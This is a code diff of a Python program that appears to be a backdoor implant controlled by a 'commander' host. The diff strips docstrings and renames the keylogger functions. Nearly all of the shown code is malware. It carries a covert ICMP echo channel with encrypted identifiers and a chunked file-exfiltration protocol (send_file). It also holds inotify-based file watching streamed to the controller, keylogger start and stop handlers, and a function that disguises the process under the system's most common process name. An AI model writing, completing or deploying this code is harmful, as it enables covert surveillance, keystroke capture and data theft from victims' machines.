@@ -206,8 +206,6 @@ def open_raw_send_socket():
 
 
 def open_raw_icmp_recv_socket():
-    """Open SOCK_RAW for ICMP with a fat receive buffer so a burst of
-    chunk packets won't overflow the kernel queue before Python drains it."""
     sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
     force_opt = getattr(socket, "SO_RCVBUFFORCE", None)
     if force_opt is not None:
@@ -316,8 +314,6 @@ def send_icmp_identifier(send_socket, source_ip, destination_ip, identifier_encr
 
 
 def send_chunk(send_socket, source_ip, destination_ip, key, chunk_index, chunk_bytes):
-    """Send one chunk: header packet (seq=CHUNK_HEADER_SEQ, id=chunk_index)
-    followed by data packets seq=1..N each carrying two bytes."""
     send_icmp_identifier(
         send_socket, source_ip, destination_ip,
         encrypt_identifier(chunk_index, key), CHUNK_HEADER_SEQ,
@@ -340,8 +336,6 @@ def send_chunk(send_socket, source_ip, destination_ip, key, chunk_index, chunk_b
 
 
 def wait_for_ack(recv_socket, source_ip, key, expected_identifier, expected_sequence, timeout):
-    """Wait for an ICMP echo from source_ip with the decrypted identifier matching
-    expected_identifier (and matching expected_sequence if not None)."""
     deadline = time.time() + timeout
     while True:
         remaining = deadline - time.time()
@@ -359,8 +353,6 @@ def wait_for_ack(recv_socket, source_ip, key, expected_identifier, expected_sequ
 
 
 def _read_icmp_echo(recv_socket, source_ip, remaining):
-    """Block up to `remaining` seconds for one ICMP echo request from source_ip.
-    Returns (sequence, decryptable_identifier_int) or None on timeout/non-match."""
     if remaining <= 0:
         return None
     recv_socket.settimeout(remaining)
@@ -383,12 +375,6 @@ def _read_icmp_echo(recv_socket, source_ip, remaining):
 
 
 def receive_metadata(recv_socket, source_ip, key, timeout):
-    """Collect metadata packets and return (filename_length, file_size, filename_bytes)
-    or None on timeout. Metadata layout:
-      seq=1: filename_length
-      seq=2: file_size hi 16 bits
-      seq=3: file_size lo 16 bits
-      seq=4..3+M: filename bytes (2 per packet)."""
     packets: dict[int, int] = {}
     filename_length: int | None = None
     expected_filename_packets: int | None = None
@@ -432,13 +418,6 @@ def receive_metadata(recv_socket, source_ip, key, timeout):
 
 def receive_chunk(recv_socket, send_socket, source_ip, my_ip, key,
                   expected_chunk_index, expected_packets, chunks_written, timeout):
-    """Receive a single chunk worth of data packets. Returns (bytes, None) on success
-    or (None, missing_count) on timeout so the caller can log how much was lost.
-
-    Handles three cases inline:
-      * Duplicate chunk header for an already-written chunk -> re-ACK and keep waiting.
-      * Chunk header for the expected chunk -> reset buffer and restart per-attempt timer.
-      * Stray data packets before a header arrives -> ignored."""
     packets: dict[int, int] = {}
     saw_header = False
     deadline = time.time() + timeout
@@ -481,8 +460,6 @@ def receive_chunk(recv_socket, send_socket, source_ip, my_ip, key,
 
 
 def drain_for_end(recv_socket, send_socket, source_ip, my_ip, key, chunks_written, timeout):
-    """After the final chunk is written, keep listening briefly for the END marker
-    and re-ACK any duplicate chunk headers from in-flight commander retries."""
     deadline = time.time() + timeout
     while True:
         remaining = deadline - time.time()
@@ -501,8 +478,6 @@ def drain_for_end(recv_socket, send_socket, source_ip, my_ip, key, chunks_writte
 
 
 def _send_watch_event_line(send_socket, source_ip, dest_ip, key, line):
-    """Send one inotify event line to commander with no ACK (fire-and-forget).
-    seq=0 carries the byte length; seq=1..N carry 2 bytes of UTF-8 text each."""
     text = line.encode("utf-8")
     n = len(text)
     send_icmp_identifier(send_socket, source_ip, dest_ip,
@@ -516,8 +491,6 @@ def _send_watch_event_line(send_socket, source_ip, dest_ip, key, line):
 
 
 def _watch_and_stream(ctx: Context, recursive: bool):
-    """Receive the path to watch from commander, start inotify, and stream events back
-    until commander sends WATCH_STOP or WATCH_TIMEOUT_SECONDS elapses."""
     try:
         from inotify_simple import INotify, flags as iflags
     except ImportError:
@@ -669,8 +642,6 @@ def _watch_and_stream(ctx: Context, recursive: bool):
 
 
 def receive_byte_metadata(recv_socket, source_ip, key, timeout):
-    """Receive the 2-packet byte-stream metadata header: seq=1 size_hi, seq=2 size_lo.
-    Returns the 32-bit byte count or None on timeout."""
     packets: dict[int, int] = {}
     deadline = time.time() + timeout
     while True:
@@ -688,10 +659,6 @@ def receive_byte_metadata(recv_socket, source_ip, key, timeout):
 
 
 def send_byte_stream_chunked(send_socket, recv_socket, my_ip, peer_ip, key, payload):
-    """Send `payload` to peer using the chunk+ACK protocol.
-    Sequence: metadata (size_hi, size_lo) -> wait ACK_META -> per-chunk
-    send+wait ACK_CHUNK with retries -> fire-and-forget END -> wait ACK_END.
-    Returns True on success, False otherwise."""
     byte_count = len(payload)
     byte_count_hi = (byte_count >> 16) & 0xFFFF
     byte_count_lo = byte_count & 0xFFFF
@@ -733,7 +700,6 @@ def send_byte_stream_chunked(send_socket, recv_socket, my_ip, peer_ip, key, payl
 
 
 def receive_byte_stream_chunked(recv_socket, send_socket, my_ip, peer_ip, key, metadata_timeout):
-    """Receive a chunked byte stream. Returns the assembled bytes or None on failure."""
     byte_count = receive_byte_metadata(recv_socket, peer_ip, key, metadata_timeout)
     if byte_count is None:
         return None
@@ -997,9 +963,6 @@ def receive_file(ctx: Context):
 
 
 def send_file(ctx: Context):
-    """Handle CMD_REQUEST_FILE: receive the requested path, read the file,
-    stream the bytes back via the chunked protocol. An empty stream signals
-    'not found / unreadable' to commander."""
     if not ctx.connected_to:
         return
 
@@ -1063,7 +1026,7 @@ def send_file(ctx: Context):
         send_socket.close()
 
 
-def run_kl(ctx: Context):
+def start_keylogger(ctx: Context):
     if not ctx.connected_to:
         return
     source_ip = detect_source_ip(ctx.connected_to)
@@ -1120,7 +1083,7 @@ def run_kl(ctx: Context):
         send_socket.close()
 
 
-def stop_kl(ctx: Context):
+def stop_keylogger(ctx: Context):
     if not ctx.connected_to:
         return
 
@@ -1249,8 +1212,6 @@ def run_program(ctx: Context):
 
 
 def rename_process():
-    """Rename this process to the most common process name found on the system"""
-    
     print("Renaming process...")
     print(f"  Current process PID: {os.getpid()}")
     
@@ -1333,10 +1294,10 @@ if __name__ == "__main__":
                 break
             elif command_code == CMD_RUN_KL:
                 print("\nStarting key logger...")
-                run_kl(ctx)
+                start_keylogger(ctx)
             elif command_code == CMD_STOP_KL:
                 print("\nStopping key logger...")
-                stop_kl(ctx)
+                stop_keylogger(ctx)
             elif command_code == CMD_TRANSFER_FILE:
                 print("\nReceiving file...")
                 receive_file(ctx)
